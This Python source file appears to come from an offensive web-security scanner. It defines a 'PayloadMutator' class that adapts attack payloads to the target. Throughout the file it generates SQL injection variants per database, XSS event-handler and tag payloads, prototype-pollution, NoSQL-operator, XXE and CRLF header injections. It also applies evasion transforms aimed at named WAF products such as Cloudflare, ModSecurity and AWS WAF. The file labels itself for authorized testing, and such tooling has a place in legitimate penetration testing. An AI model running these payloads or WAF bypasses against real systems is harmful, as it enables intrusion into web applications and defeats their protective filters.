"""Context-aware payload mutation engine.

Titan Edition (v7.0) introduces intelligent payload mutation that adapts
payloads to the injection context, detected WAF, and target technology
stack.  Instead of blindly applying all payloads, the mutator generates
context-specific variants that are more likely to succeed and less likely
to trigger false positives.

For authorized security testing only.
"""
import logging
import random
import re
from typing import Dict, List, Optional

logger = logging.getLogger("venomstrike.payload_mutator")


class PayloadMutator:
    """Generate context-aware payload variants.

    The mutator takes a base payload and injection context (parameter type,
    data type, reflection context, detected technology) and produces a ranked
    list of mutations most likely to succeed in that context.

    Usage::

        mutator = PayloadMutator()
        variants = mutator.mutate(
            payload="' OR 1=1 --",
            context={"data_type": "string", "param_type": "query",
                     "technology": "mysql"},
        )
    """

    # ── Technology-specific mutation strategies ────────────────────

    TECH_MUTATIONS: Dict[str, List[str]] = {
        "mysql": [
            "mysql_comment", "hex_string", "concat_bypass",
            "version_comment", "information_schema",
        ],
        "postgresql": [
            "dollar_quote", "cast_bypass", "pg_sleep",
            "string_agg", "chr_bypass",
        ],
        "mssql": [
            "exec_bypass", "char_bypass", "waitfor_delay",
            "openrowset", "square_bracket",
        ],
        "oracle": [
            "dual_bypass", "chr_bypass", "utl_http",
            "dbms_pipe", "all_tables",
        ],
        "sqlite": [
            "random_func", "typeof_bypass", "glob_match",
            "replace_func", "substr_bypass",
        ],
    }

    # ── Context-specific mutation strategies ───────────────────────

    CONTEXT_MUTATIONS: Dict[str, List[str]] = {
        "tag_content": [
            "script_inject", "img_onerror", "svg_onload",
            "body_onload", "iframe_srcdoc",
        ],
        "attribute": [
            "attribute_breakout", "event_handler",
            "javascript_uri", "data_uri", "onfocus_autofocus",
        ],
        "script": [
            "string_breakout", "template_literal",
            "prototype_chain", "constructor_call", "eval_bypass",
        ],
        "json_value": [
            "json_injection", "unicode_escape",
            "nested_object", "prototype_pollution",
        ],
        "xml_value": [
            "entity_injection", "cdata_breakout",
            "dtd_override", "parameter_entity",
        ],
        "url_param": [
            "url_encode", "double_encode",
            "path_traversal", "fragment_inject",
        ],
        "header_value": [
            "crlf_inject", "header_split",
            "null_byte", "encoding_switch",
        ],
    }

    # ── WAF-specific evasion mutations ────────────────────────────

    WAF_MUTATIONS: Dict[str, List[str]] = {
        "Cloudflare": [
            "unicode_normalize", "chunked_body", "case_randomize",
            "comment_stuff", "multipart_wrap",
        ],
        "ModSecurity": [
            "overlong_utf8", "null_byte_prefix", "comment_inject",
            "version_comment", "double_encode",
        ],
        "Imperva/Incapsula": [
            "json_smuggle", "multipart_boundary", "tab_substitute",
            "parameter_pollution", "encoding_rotate",
        ],
        "AWS WAF": [
            "case_variation", "whitespace_vary", "scientific_notation",
            "hex_encode", "concat_split",
        ],
        "Akamai": [
            "double_url_encode", "unicode_escape", "chunked_transfer",
            "json_unicode", "path_normalization",
        ],
        "Sucuri": [
            "comment_injection", "hex_encode", "case_variation",
            "null_byte_injection", "whitespace_variation",
        ],
        "Generic WAF": [
            "case_variation", "comment_injection", "url_encode",
            "double_url_encode", "whitespace_variation",
        ],
    }

    def mutate(
        self,
        payload: str,
        context: Optional[Dict] = None,
        waf_name: Optional[str] = None,
        max_variants: int = 10,
    ) -> List[str]:
        """Generate context-aware payload mutations.

        Args:
            payload: The base payload to mutate.
            context: Injection context dict with keys like ``data_type``,
                ``param_type``, ``reflection_context``, ``technology``.
            waf_name: Name of detected WAF (if any).
            max_variants: Maximum number of variants to return.

        Returns:
            List of mutated payloads, always including the original.
        """
        context = context or {}
        variants = [payload]

        # 1. Technology-specific mutations
        tech = context.get("technology", "").lower()
        if tech in self.TECH_MUTATIONS:
            tech_variants = self._apply_tech_mutations(payload, tech)
            variants.extend(tech_variants)

        # 2. Context-specific mutations
        reflection = context.get("reflection_context", "")
        if reflection in self.CONTEXT_MUTATIONS:
            ctx_variants = self._apply_context_mutations(payload, reflection)
            variants.extend(ctx_variants)

        # 3. Data-type-aware mutations
        data_type = context.get("data_type", "string")
        dt_variants = self._apply_datatype_mutations(payload, data_type)
        variants.extend(dt_variants)

        # 4. WAF-specific mutations
        if waf_name and waf_name in self.WAF_MUTATIONS:
            waf_variants = self._apply_waf_mutations(payload, waf_name)
            variants.extend(waf_variants)

        # Deduplicate while preserving order
        seen = set()
        unique = []
        for v in variants:
            if v not in seen:
                seen.add(v)
                unique.append(v)

        # Trim to max_variants, always keeping original first
        if len(unique) > max_variants:
            unique = [unique[0]] + random.sample(unique[1:], max_variants - 1)

        return unique

    # ── Technology mutations ───────────────────────────────────────

    def _apply_tech_mutations(self, payload: str, tech: str) -> List[str]:
        """Apply technology-specific mutations."""
        mutations = []

        if tech == "mysql":
            mutations.append(self._mysql_comment_wrap(payload))
            mutations.append(self._mysql_hex_string(payload))
            mutations.append(self._mysql_concat_split(payload))
        elif tech == "postgresql":
            mutations.append(self._pg_dollar_quote(payload))
            mutations.append(self._pg_cast_bypass(payload))
        elif tech == "mssql":
            mutations.append(self._mssql_exec_wrap(payload))
            mutations.append(self._mssql_char_bypass(payload))
        elif tech == "oracle":
            mutations.append(self._oracle_chr_bypass(payload))
        elif tech == "sqlite":
            mutations.append(self._sqlite_typeof(payload))

        return [m for m in mutations if m and m != payload]

    @staticmethod
    def _mysql_comment_wrap(payload: str) -> str:
        """Wrap SQL keywords in MySQL version comments."""
        kw_re = re.compile(
            r"\b(SELECT|UNION|FROM|WHERE|AND|OR|SLEEP|BENCHMARK)\b",
            re.IGNORECASE,
        )
        return kw_re.sub(lambda m: f"/*!50000{m.group()}*/", payload)

    @staticmethod
    def _mysql_hex_string(payload: str) -> str:
        """Convert string literals to MySQL hex notation."""
        def _to_hex(m: re.Match) -> str:
            content = m.group(1)
            hex_str = content.encode().hex()
            return f"0x{hex_str}"
        return re.sub(r"'([^']{1,50})'", _to_hex, payload)

    @staticmethod
    def _mysql_concat_split(payload: str) -> str:
        """Split string literals into CONCAT() calls."""
        def _split(m: re.Match) -> str:
            content = m.group(1)
            if len(content) <= 2:
                return m.group(0)
            mid = len(content) // 2
            return f"CONCAT('{content[:mid]}','{content[mid:]}')"
        return re.sub(r"'([^']{3,})'", _split, payload)

    @staticmethod
    def _pg_dollar_quote(payload: str) -> str:
        """Replace single quotes with PostgreSQL dollar quoting."""
        return payload.replace("'", "$$")

    @staticmethod
    def _pg_cast_bypass(payload: str) -> str:
        """Add PostgreSQL CAST wrapping to numeric values."""
        return re.sub(r"\b(\d+)\b", r"CAST(\1 AS INT)", payload)

    @staticmethod
    def _mssql_exec_wrap(payload: str) -> str:
        """Wrap in MSSQL EXEC for stored procedure context."""
        if payload.strip().upper().startswith("EXEC"):
            return payload
        return f"EXEC('{payload.replace(chr(39), chr(39)+chr(39))}')"

    @staticmethod
    def _mssql_char_bypass(payload: str) -> str:
        """Replace characters with MSSQL CHAR() calls."""
        special = {"'": "CHAR(39)", '"': "CHAR(34)", " ": "CHAR(32)"}
        result = payload
        for ch, replacement in special.items():
            result = result.replace(ch, f"+{replacement}+")
        return result

    @staticmethod
    def _oracle_chr_bypass(payload: str) -> str:
        """Replace characters with Oracle CHR() calls."""
        special = {"'": "CHR(39)", '"': "CHR(34)"}
        result = payload
        for ch, replacement in special.items():
            result = result.replace(ch, f"||{replacement}||")
        return result

    @staticmethod
    def _sqlite_typeof(payload: str) -> str:
        """Add SQLite typeof() wrapper for type confusion."""
        return f"typeof({payload})"

    # ── Context mutations ──────────────────────────────────────────

    def _apply_context_mutations(
        self, payload: str, context: str,
    ) -> List[str]:
        """Apply injection-context-specific mutations."""
        mutations = []

        if context == "attribute":
            mutations.append(f'" autofocus onfocus="{payload}"')
            mutations.append(f"' onfocus='{payload}' autofocus='")
            mutations.append(f'" onmouseover="{payload}"')
        elif context == "script":
            mutations.append(f"';{payload}//")
            mutations.append(f"\";{payload}//")
            mutations.append(f"`${{{{({payload})}}}}`")
        elif context == "tag_content":
            mutations.append(f"<img src=x onerror={payload}>")
            mutations.append(f"<svg onload={payload}>")
            mutations.append(f"<body onload={payload}>")
        elif context == "json_value":
            mutations.append(f'","__proto__":{{"polluted":"{payload}"}}')
            mutations.append(payload.replace('"', '\\"'))
        elif context == "header_value":
            mutations.append(f"\r\nX-Injected: {payload}")
            mutations.append(f"%0d%0aX-Injected:%20{payload}")

        return [m for m in mutations if m and m != payload]

    # ── Data-type mutations ────────────────────────────────────────

    def _apply_datatype_mutations(
        self, payload: str, data_type: str,
    ) -> List[str]:
        """Apply data-type-aware mutations."""
        mutations = []

        if data_type == "integer":
            mutations.append(f"0 OR {payload}")
            mutations.append(f"1 AND {payload}")
            mutations.append(f"-1 UNION {payload}")
        elif data_type == "url":
            mutations.append(f"javascript:{payload}")
            mutations.append(f"data:text/html,{payload}")
        elif data_type == "json":
            mutations.append(f'{{"$gt":"","$where":"{payload}"}}')
        elif data_type == "xml":
            mutations.append(
                f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{payload}">]>'
                f"<foo>&xxe;</foo>"
            )

        return [m for m in mutations if m and m != payload]

    # ── WAF-specific mutations ─────────────────────────────────────

    def _apply_waf_mutations(
        self, payload: str, waf_name: str,
    ) -> List[str]:
        """Apply WAF-specific evasion mutations."""
        mutations = []

        # Common cross-WAF mutations
        mutations.append(self._unicode_normalize(payload))
        mutations.append(self._comment_stuff(payload))

        # WAF-specific
        if waf_name in ("Cloudflare", "Akamai"):
            mutations.append(self._chunked_split(payload))
        if waf_name in ("ModSecurity", "Sucuri"):
            mutations.append(self._overlong_encode(payload))
        if waf_name in ("Imperva/Incapsula",):
            mutations.append(self._json_wrap(payload))
        if waf_name in ("AWS WAF",):
            mutations.append(self._scientific_numbers(payload))

        return [m for m in mutations if m and m != payload]

    @staticmethod
    def _unicode_normalize(payload: str) -> str:
        """Replace characters with Unicode fullwidth equivalents."""
        mapping = {
            "<": "\uff1c", ">": "\uff1e", "'": "\uff07",
            '"': "\uff02", "/": "\uff0f", "\\": "\uff3c",
        }
        return "".join(mapping.get(c, c) for c in payload)

    @staticmethod
    def _comment_stuff(payload: str) -> str:
        """Insert SQL-style comments between every keyword character."""
        kw_re = re.compile(
            r"\b(SELECT|UNION|FROM|WHERE|INSERT|UPDATE|DELETE)\b",
            re.IGNORECASE,
        )
        def _stuff(m: re.Match) -> str:
            return "/**/".join(m.group())
        return kw_re.sub(_stuff, payload)

    @staticmethod
    def _chunked_split(payload: str) -> str:
        """Split payload for chunked transfer evasion."""
        if len(payload) < 4:
            return payload
        mid = len(payload) // 2
        return f"{payload[:mid]}\r\n{payload[mid:]}"

    @staticmethod
    def _overlong_encode(payload: str) -> str:
        """Encode angle brackets as overlong UTF-8."""
        return payload.replace("<", "%c0%bc").replace(">", "%c0%be")

    @staticmethod
    def _json_wrap(payload: str) -> str:
        """Wrap payload in JSON with Unicode escapes."""
        escaped = "".join(f"\\u{ord(c):04x}" for c in payload)
        return f'{{"value":"{escaped}"}}'

    @staticmethod
    def _scientific_numbers(payload: str) -> str:
        """Replace integers with scientific notation."""
        def _convert(m: re.Match) -> str:
            val = int(m.group())
            if val == 0:
                return "0e0"
            return f"{val}.0e0"
        return re.sub(r"\b(\d+)\b", _convert, payload)

    def get_mutation_strategies(
        self, context: Optional[Dict] = None, waf_name: Optional[str] = None,
    ) -> List[str]:
        """List mutation strategies that would be applied for a given context.

        Useful for logging and audit trails.
        """
        context = context or {}
        strategies = ["base_payload"]

        tech = context.get("technology", "").lower()
        if tech in self.TECH_MUTATIONS:
            strategies.extend(self.TECH_MUTATIONS[tech])

        reflection = context.get("reflection_context", "")
        if reflection in self.CONTEXT_MUTATIONS:
            strategies.extend(self.CONTEXT_MUTATIONS[reflection])

        if waf_name and waf_name in self.WAF_MUTATIONS:
            strategies.extend(self.WAF_MUTATIONS[waf_name])

        return strategies
